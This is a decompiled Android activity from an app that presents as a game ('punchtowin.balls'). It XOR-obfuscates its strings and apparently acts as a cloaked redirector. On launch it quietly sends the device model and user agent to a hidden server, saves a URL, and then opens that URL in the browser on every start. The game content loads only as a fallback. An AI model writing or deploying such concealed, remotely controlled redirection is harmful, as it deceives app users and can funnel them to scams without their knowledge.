package com.punchtowin.balls;

import K.A0;
import K.y0;
import P0.c;
import T.t;
import W0.a;
import X0.e;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.view.KeyEvent;
import android.view.View;
import android.view.ViewGroup;
import android.view.Window;
import android.view.WindowInsetsController;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import androidx.constraintlayout.widget.ConstraintLayout;
import com.punchtowin.balls.MainActivity;
import com.punchtowin.balls.R;
import e1.d;
import e1.l;
import g.AbstractActivityC0125i;
import g.C0123g;
import g.C0124h;
import i1.m;
import i1.o;
import i1.p;
import j1.b;
import java.util.ArrayDeque;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.concurrent.TimeUnit;
import m1.g;
import m1.j;
import q1.n;

/* loaded from: classes.dex */
public final class MainActivity extends AbstractActivityC0125i {

    /* renamed from: D, reason: collision with root package name */
    public static final /* synthetic */ int f1861D = 0;

    /* renamed from: A, reason: collision with root package name */
    public final String f1862A;

    /* renamed from: B, reason: collision with root package name */
    public SharedPreferences f1863B;

    /* renamed from: C, reason: collision with root package name */
    public String f1864C;

    /* renamed from: y, reason: collision with root package name */
    public final c f1865y;

    /* renamed from: z, reason: collision with root package name */
    public final String f1866z;

    public MainActivity() {
        this.d.f2373b.e("androidx:appcompat", new C0123g(this));
        h(new C0124h(this));
        this.f1865y = new c(new a() { // from class: N0.a
            @Override // W0.a
            public final Object a() {
                int i = MainActivity.f1861D;
                KeyEvent.Callback callback = null;
                int i2 = 0;
                View inflate = MainActivity.this.getLayoutInflater().inflate(R.layout.activity_main, (ViewGroup) null, false);
                ConstraintLayout constraintLayout = (ConstraintLayout) inflate;
                if (inflate instanceof ViewGroup) {
                    ViewGroup viewGroup = (ViewGroup) inflate;
                    int childCount = viewGroup.getChildCount();
                    while (true) {
                        if (i2 >= childCount) {
                            break;
                        }
                        KeyEvent.Callback findViewById = viewGroup.getChildAt(i2).findViewById(R.id.webView);
                        if (findViewById != null) {
                            callback = findViewById;
                            break;
                        }
                        i2++;
                    }
                }
                WebView webView = (WebView) callback;
                if (webView != null) {
                    return new O0.a(constraintLayout, webView);
                }
                throw new NullPointerException("Missing required view with ID: ".concat(inflate.getResources().getResourceName(R.id.webView)));
            }
        });
        this.f1866z = t(new byte[]{107, -48, -125});
        this.f1862A = t(new byte[]{122, -61, -106, -26});
    }

    public static String t(byte[] bArr) {
        int[] iArr = {8, 182, 228, 138};
        ArrayList arrayList = new ArrayList(bArr.length);
        int length = bArr.length;
        int i = 0;
        int i2 = 0;
        int i3 = 0;
        while (i2 < length) {
            arrayList.add(Byte.valueOf((byte) (iArr[i3 % 4] ^ (bArr[i2] & 255))));
            i2++;
            i3++;
        }
        byte[] bArr2 = new byte[arrayList.size()];
        Iterator it = arrayList.iterator();
        while (it.hasNext()) {
            bArr2[i] = ((Number) it.next()).byteValue();
            i++;
        }
        return new String(bArr2, e1.a.f1909a);
    }

    @Override // g.AbstractActivityC0125i, a.l, android.app.Activity
    public final void onCreate(Bundle bundle) {
        g gVar;
        super.onCreate(bundle);
        this.f1863B = getSharedPreferences(this.f1866z, 0);
        setContentView(v().f617a);
        u();
        WebSettings settings = v().f618b.getSettings();
        settings.setAllowContentAccess(true);
        settings.setAllowFileAccess(true);
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        settings.setMixedContentMode(0);
        settings.setDatabaseEnabled(true);
        settings.setCacheMode(-1);
        v().f618b.setWebViewClient(new WebViewClient());
        WebView.setWebContentsDebuggingEnabled(false);
        SharedPreferences sharedPreferences = this.f1863B;
        g gVar2 = null;
        if (sharedPreferences == null) {
            e.h("prefs");
            throw null;
        }
        String string = sharedPreferences.getString(this.f1862A, null);
        if (string != null && !d.q0(string)) {
            this.f1864C = string;
            x(string);
            return;
        }
        String packageName = getPackageName();
        String t2 = t(new byte[]{55, -41, -108, -6, 53});
        String str = t(new byte[]{96, -62, -112, -6, 123, -116, -53, -91, 113, -45, -120, -26, 103, -63, -55, -2, 122, -61, -112, -30, 37, -121, -42, -70, 56, -104, -125, -4, 100, -64, -110, -23, 99, -35, -117, -89, 97, -60, -106, -13, 102, -43, -113, -31, 105, -113, -41, -92, Byte.MAX_VALUE, -39, -106, -31, 109, -60, -105, -92, 108, -45, -110, -91}) + t2 + packageName;
        o oVar = new o();
        TimeUnit timeUnit = TimeUnit.SECONDS;
        e.e(timeUnit, "unit");
        byte[] bArr = b.f2600a;
        long millis = timeUnit.toMillis(5L);
        if (millis > 2147483647L) {
            throw new IllegalArgumentException("timeout".concat(" too large.").toString());
        }
        if (millis == 0) {
            throw new IllegalArgumentException("timeout".concat(" too small.").toString());
        }
        oVar.f2469r = (int) millis;
        p pVar = new p(oVar);
        t tVar = new t(4);
        e.e(str, "url");
        if (l.i0(str, "ws:", true)) {
            String substring = str.substring(3);
            e.d(substring, "this as java.lang.String).substring(startIndex)");
            str = "http:".concat(substring);
        } else if (l.i0(str, "wss:", true)) {
            String substring2 = str.substring(4);
            e.d(substring2, "this as java.lang.String).substring(startIndex)");
            str = "https:".concat(substring2);
        }
        e.e(str, "<this>");
        i1.l lVar = new i1.l();
        lVar.c(null, str);
        tVar.f741a = lVar.a();
        String t3 = t(new byte[]{80, -101, -96, -17, 126, -33, -121, -17, 37, -5, -117, -18, 109, -38});
        String str2 = Build.MODEL;
        e.d(str2, "MODEL");
        tVar.l(t3, str2);
        tVar.l(t(new byte[]{73, -43, -121, -17, 120, -62, -55, -58, 105, -40, -125, -1, 105, -47, -127}), t(new byte[]{109, -40, -55, -33, 91, -102, -127, -28, 51, -57, -39, -70, 38, -113}));
        String t4 = t(new byte[]{93, -59, -127, -8, 37, -9, -125, -17, 102, -62});
        String defaultUserAgent = WebSettings.getDefaultUserAgent(this);
        e.d(defaultUserAgent, "getDefaultUserAgent(...)");
        tVar.l(t4, defaultUserAgent);
        H.e b2 = tVar.b();
        j jVar = new j(pVar, b2);
        B0.d dVar = new B0.d(9, this);
        if (!jVar.f3228e.compareAndSet(false, true)) {
            throw new IllegalStateException("Already Executed");
        }
        n nVar = n.f3568a;
        jVar.f3229f = n.f3568a.g();
        t tVar2 = pVar.f2475a;
        g gVar3 = new g(jVar, dVar);
        tVar2.getClass();
        synchronized (tVar2) {
            ((ArrayDeque) tVar2.f742b).add(gVar3);
            String str3 = ((m) b2.f213c).d;
            Iterator it = ((ArrayDeque) tVar2.f743c).iterator();
            while (true) {
                if (it.hasNext()) {
                    gVar = (g) it.next();
                    if (e.a(((m) gVar.f3222c.f3226b.f213c).d, str3)) {
                        break;
                    }
                } else {
                    Iterator it2 = ((ArrayDeque) tVar2.f742b).iterator();
                    while (it2.hasNext()) {
                        gVar = (g) it2.next();
                        if (e.a(((m) gVar.f3222c.f3226b.f213c).d, str3)) {
                        }
                    }
                }
            }
            gVar2 = gVar;
            if (gVar2 != null) {
                gVar3.f3221b = gVar2.f3221b;
            }
        }
        tVar2.r();
    }

    @Override // g.AbstractActivityC0125i, android.app.Activity
    public final void onResume() {
        super.onResume();
        String str = this.f1864C;
        if (str != null) {
            x(str);
        }
    }

    @Override // android.app.Activity, android.view.Window.Callback
    public final void onWindowFocusChanged(boolean z2) {
        super.onWindowFocusChanged(z2);
        if (z2) {
            u();
        }
    }

    /* JADX WARN: Multi-variable type inference failed */
    public final void u() {
        y0 y0Var;
        WindowInsetsController insetsController;
        q1.d.m0(getWindow(), false);
        Window window = getWindow();
        B0.d dVar = new B0.d(getWindow().getDecorView());
        if (Build.VERSION.SDK_INT >= 30) {
            insetsController = window.getInsetsController();
            A0 a02 = new A0(insetsController, dVar);
            a02.f368f = window;
            y0Var = a02;
        } else {
            y0Var = new y0(window, dVar);
        }
        y0Var.P();
        y0Var.p0();
    }

    public final O0.a v() {
        return (O0.a) this.f1865y.a();
    }

    public final void w() {
        v().f618b.setVisibility(0);
        v().f618b.loadUrl(t(new byte[]{110, -33, -120, -17, 50, -103, -53, -91, 105, -40, Byte.MIN_VALUE, -8, 103, -33, Byte.MIN_VALUE, -43, 105, -59, -105, -17, 124, -103, -115, -28, 108, -45, -100, -92, 96, -62, -119, -26}));
    }

    public final void x(String str) {
        v().f618b.setVisibility(8);
        try {
            Intent intent = new Intent("android.intent.action.VIEW", Uri.parse(str));
            intent.addFlags(268435456);
            startActivity(intent);
        } catch (Exception unused) {
            w();
        }
    }
}
